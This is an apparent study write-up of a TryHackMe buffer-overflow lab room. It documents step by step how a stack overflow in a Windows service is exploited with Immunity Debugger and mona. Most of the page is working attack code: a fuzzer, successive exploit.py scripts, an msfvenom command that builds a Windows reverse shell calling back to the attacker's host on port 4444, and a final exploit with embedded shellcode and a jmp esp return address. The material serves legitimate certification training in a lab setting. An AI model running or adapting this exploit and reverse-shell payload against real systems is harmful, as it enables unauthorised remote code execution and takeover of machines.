---
description: 'Trib3rius: https://tryhackme.com/room/bufferoverflowprep'
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/course-review/cyber-security-courses-journey/oscp-journey/ctf/buffer-overflow/bof-tib3rius
---

# BOF - Tib3rius

### 1- Mona Configuration

First the first, you can set up mona module

```
!mona config -set workingfolder c:\mona\%p
```

### 2- Fuzzing

Create a file on your Kali box called **fuzzer.py** with the following contents:

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.202.33"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

<figure><img src="../../../../../.gitbook/assets/image (632).png" alt=""><figcaption></figcaption></figure>

We can see that the application crashed at the 2000 bytes. On immunity debugger, **"Access Violation when executing 41414141"**&#x20;

<figure><img src="../../../../../.gitbook/assets/image (652).png" alt=""><figcaption></figcaption></figure>

> Make sure to restart application every steps.

### 3- Crash Replication & Controlling EIP

Create another file on your Kali box called **exploit.py** with the following contents:

```python
import socket

ip = "10.10.202.33"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

• Generate offset with length <mark style="color:red;">**400 bytes**</mark> longer that the crashed string.

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
```

• Copy the output and place it into the <mark style="color:red;background-color:red;">**payload variable**</mark> of exploit.py script.

```python
import socket

ip = "10.10.202.33"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Once we executed the script, the application will be crashed again.

```python
└─$ python3 2-exploit.py 
Sending evil buffer...
Done!
```

Once the application crashed, we can run mona command on the same length as the pattern we created.

```
!mona findmsp -distance 2400
```

The output should be like:

```
EIP contains normal pattern : ..... (offset xxxxx)
```

<figure><img src="../../../../../.gitbook/assets/image (654).png" alt=""><figcaption></figcaption></figure>

• let update our payload script and set the <mark style="color:red;background-color:red;">**offset**</mark> <mark style="color:red;background-color:red;">**variable**</mark> to the value (offset 1978) previously set to 0.&#x20;

• Set the <mark style="color:red;background-color:red;">**payload variable**</mark> to empty.&#x20;

• Set the <mark style="color:red;background-color:red;">**retn variable**</mark> to “**BBBB**”.

We can run the exploit.py script again and the EIP register should be overwritten with 4 B's (42424242).

```python
import socket

ip = "10.10.202.33"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
  
```

<figure><img src="../../../../../.gitbook/assets/image (691).png" alt=""><figcaption></figcaption></figure>

### 4- Finding Bad Characters

Generate a bytearray using mona and exclude null byte **\x00**. The location **bytearray.bin** file will be in _<mark style="background-color:green;">**C:\mona\oscp\bytearray.bin**</mark>_.

<figure><img src="../../../../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>

```
!mona bytearray -b "\x00"
```

Now, we need to generate string of bad chars by python3 script

```python
#!/usr/bin/env python3

for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()

```

• Update **exploit.py** script by set the <mark style="color:red;background-color:red;">**payload variable**</mark> to the string of bad chards.

```python
import socket

ip = "10.10.202.33"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
  
```

Once the application crashed, we can compare the address to which the **ESP register** points by mona command:

<figure><img src="../../../../../.gitbook/assets/image (693).png" alt=""><figcaption></figcaption></figure>

```
!mona compare -f C:\mona\oscp\bytearray.bin -a 01A2FA30
```

<figure><img src="../../../../../.gitbook/assets/image (643).png" alt=""><figcaption></figcaption></figure>

> <mark style="color:red;">**Note that all of these might not be badchars! We need to remove one by one and \x00 by default will be badchars.**</mark>

We can run mona command to generate new bytearray.bin again and remove badchars on our exploit.py script.

```
!mona bytearray -b "\x00\x07"
```

Then we can perform comparison again with the same step with different ESP value.

<figure><img src="../../../../../.gitbook/assets/image (655).png" alt=""><figcaption></figcaption></figure>

```
!mona bytearray -b "\x00\x07\x2e\xa0"
```

We remove badchars one by one and compare until we reach to <mark style="color:green;background-color:green;">**Unmodified status**</mark>.

<figure><img src="../../../../../.gitbook/assets/image (697).png" alt=""><figcaption></figcaption></figure>

### 5- Finding a Jump Point

Let finds all **"jmp esp"** instructions with address that don't contain any of the badchars specified. (Log Data)

```
!mona jmp -r esp -cpb "\x00"
```

<figure><img src="../../../../../.gitbook/assets/image (621).png" alt=""><figcaption></figcaption></figure>

• choose an address with status **"False"**. Set the value of address to <mark style="color:red;background-color:red;">**“retn” variable**</mark> with backwards (little endian) • example <mark style="background-color:yellow;">**0x625011af**</mark> <mark style="background-color:yellow;"></mark><mark style="background-color:yellow;">=</mark> <mark style="background-color:yellow;"></mark><mark style="background-color:yellow;">**\xaf\x11\x50\x62**</mark>

### 6- Generate Payload

Generate reverse shell payload with specify badchars -b options

{% code overflow="wrap" %}
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.60.241 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
```
{% endcode %}

• Copy C code strings and set value on <mark style="color:red;background-color:red;">**payload variable**</mark>

### 7- Prepend NOPs

We need to add some space in memory for payload. We can add <mark style="color:red;background-color:red;">**padding variable**</mark> to 16 or more “No Operation” (\x90) bytes:

```
padding = “\x90” * 16
```

### 8- Exploit

```python
import socket

ip = "10.10.202.33"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xba\x61\x67\xce\xe0\xdd\xc7\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x31\x56\x12\x03\x56\x12\x83\xa7\x63\x2c\x15\xdb\x84\x32"
"\xd6\x23\x55\x53\x5e\xc6\x64\x53\x04\x83\xd7\x63\x4e\xc1\xdb"
"\x08\x02\xf1\x68\x7c\x8b\xf6\xd9\xcb\xed\x39\xd9\x60\xcd\x58"
"\x59\x7b\x02\xba\x60\xb4\x57\xbb\xa5\xa9\x9a\xe9\x7e\xa5\x09"
"\x1d\x0a\xf3\x91\x96\x40\x15\x92\x4b\x10\x14\xb3\xda\x2a\x4f"
"\x13\xdd\xff\xfb\x1a\xc5\x1c\xc1\xd5\x7e\xd6\xbd\xe7\x56\x26"
"\x3d\x4b\x97\x86\xcc\x95\xd0\x21\x2f\xe0\x28\x52\xd2\xf3\xef"
"\x28\x08\x71\xeb\x8b\xdb\x21\xd7\x2a\x0f\xb7\x9c\x21\xe4\xb3"
"\xfa\x25\xfb\x10\x71\x51\x70\x97\x55\xd3\xc2\xbc\x71\xbf\x91"
"\xdd\x20\x65\x77\xe1\x32\xc6\x28\x47\x39\xeb\x3d\xfa\x60\x64"
"\xf1\x37\x9a\x74\x9d\x40\xe9\x46\x02\xfb\x65\xeb\xcb\x25\x72"
"\x0c\xe6\x92\xec\xf3\x09\xe3\x25\x30\x5d\xb3\x5d\x91\xde\x58"
"\x9d\x1e\x0b\xce\xcd\xb0\xe4\xaf\xbd\x70\x55\x58\xd7\x7e\x8a"
"\x78\xd8\x54\xa3\x13\x23\x3f\xc6\xeb\x17\x4e\xbe\xe9\x67\xa1"
"\x63\x67\x81\xab\x8b\x21\x1a\x44\x35\x68\xd0\xf5\xba\xa6\x9d"
"\x36\x30\x45\x62\xf8\xb1\x20\x70\x6d\x32\x7f\x2a\x38\x4d\x55"
"\x42\xa6\xdc\x32\x92\xa1\xfc\xec\xc5\xe6\x33\xe5\x83\x1a\x6d"
"\x5f\xb1\xe6\xeb\x98\x71\x3d\xc8\x27\x78\xb0\x74\x0c\x6a\x0c"
"\x74\x08\xde\xc0\x23\xc6\x88\xa6\x9d\xa8\x62\x71\x71\x63\xe2"
"\x04\xb9\xb4\x74\x09\x94\x42\x98\xb8\x41\x13\xa7\x75\x06\x93"
"\xd0\x6b\xb6\x5c\x0b\x28\xd6\xbe\x99\x45\x7f\x67\x48\xe4\xe2"
"\x98\xa7\x2b\x1b\x1b\x4d\xd4\xd8\x03\x24\xd1\xa5\x83\xd5\xab"
"\xb6\x61\xd9\x18\xb6\xa3")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Let start netcat listener on port 4444 and execute python script.

<figure><img src="../../../../../.gitbook/assets/image (698).png" alt=""><figcaption></figcaption></figure>

